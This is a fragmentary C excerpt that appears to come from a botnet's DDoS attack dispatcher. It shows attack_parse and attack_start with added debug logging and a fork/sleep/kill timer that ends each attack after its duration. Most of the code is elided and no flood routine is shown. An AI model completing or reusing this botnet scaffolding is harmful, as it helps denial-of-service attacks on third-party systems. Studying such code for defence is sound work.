...
void attack_parse(char *buf, int len)
{
    ...
    {
        char ipbuf[64];
        debug_logf("ATTACK_PARSE: duration=%u vector=%u targs=%u opts=%u\n",
                   (unsigned)duration, (unsigned)vector, (unsigned)targs_len, (unsigned)opts_len);
        for (i = 0; i < targs_len; i++)
        {
...
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
...
#ifdef DEBUG
    debug_logf("ATTACK_START: vector=%u duration=%d targs=%u opts=%u\n",
    ...
    else if (pid2 == 0)
    {
        sleep(duration);
#ifdef DEBUG
        debug_logf("ATTACK_END: vector=%u duration=%d (signalling parent)\n", (unsigned)vector, duration);
#endif
        kill(getppid(), 9);
        exit(0);
    }
...
#ifdef DEBUG
                debug_logf("ATTACK_FUNC_RETURN: vector=%u\n", (unsigned)vector);
#endif
                break;
            }
        }
